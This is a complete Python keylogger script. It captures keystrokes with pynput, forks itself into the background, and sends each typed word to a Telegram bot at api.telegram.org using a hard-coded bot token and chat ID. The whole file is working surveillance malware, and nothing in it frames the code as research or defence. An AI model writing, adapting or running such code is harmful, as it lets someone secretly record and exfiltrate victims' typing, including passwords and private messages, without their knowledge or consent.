import subprocess
import os
from pynput import keyboard
import requests

TELEGRAM_TOKEN = '7487368327:AAG3qLN8GXhb1thhE0brlWgcisIDtFwnick'
CHAT_ID = '1174153911'
TELEGRAM_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'

buffer = []

def send_to_telegram(message):
    """Sends a message to the specified Telegram chat."""
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    try:
        response = requests.post(TELEGRAM_URL, data=payload)
        if response.status_code != 200:
            a = 3
        else:
            a = 1
    except Exception as e:
            a = 2

def on_press(key):
    global buffer
    key_str = str(key)
    if key_str == 'Key.space':
        message = ''.join(buffer).strip()
        if message:
            send_to_telegram(message)
        buffer = []
    elif key_str == 'Key.enter':
        message = ''.join(buffer).strip()
        if message:
            send_to_telegram(message)
        buffer = []
    elif len(key_str) == 3 and key_str.startswith("'") and key_str.endswith("'"):
        buffer.append(key_str[1])
    else:
        print("Special key pressed or non-printable character.")

def start_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        print("Listening for key presses...")
        listener.join()

if __name__ == "__main__":
    # Check if the script is already running in the background
    if os.fork() > 0:
        # Exit the parent process
        exit()
    # Start the listener in the child process
    start_listener()
